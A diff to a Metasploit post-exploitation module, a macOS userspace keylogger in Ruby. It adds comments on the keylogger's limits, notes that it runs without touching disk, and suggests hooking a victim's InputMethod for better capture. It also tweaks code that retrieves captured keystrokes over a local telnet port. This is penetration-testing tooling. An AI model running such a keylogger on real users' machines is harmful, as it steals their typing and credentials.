@@ -22,7 +22,17 @@ class Metasploit3 < Msf::Post
   # where we are storing the keylog
   attr_accessor :loot_path
 
-
+  # This is a pretty lousy keylogger. It polls the keyboard state repeatedly
+  # and guesses at what the user might be typing. It fails to correctly
+  # coerce punctuation and modifier keys and is untested on international
+  # keyboard layouts. It also does not work with any Cocoa password
+  # input protected by the SecureTextInput API.
+  #
+  # However, its simplicity allows us to write it as a single ruby command and run
+  # without ever touching disk.
+  #
+  # For a better approach, you can change the user's InputMethod to a custom
+  # bundle that you have compiled, with hooks for KeyEvents! This is especially handy in 10.7 :)
   def initialize(info={})
     super(update_info(info,
       'Name'          => 'OSX Capture Userspace Keylogger',
@@ -99,8 +109,9 @@ class Metasploit3 < Msf::Post
           Rex.sleep(datastore['SYNCWAIT'])
           print_status "Sending USR1 signal to open TCP port..."
           cmd_exec("kill -USR1 #{self.pid}")
-          print_status "Dumping logs..."
+          print_status "Dumping logs... telnet localhost #{self.port}"
           log = cmd_exec("telnet localhost #{self.port}")
+          puts log.inspect
           log_a = log.scan(/^\[.+?\] \[.+?\] .*$/)
           log = log_a.join("\n")+"\n"
           print_status "#{log_a.size} keystrokes captured"
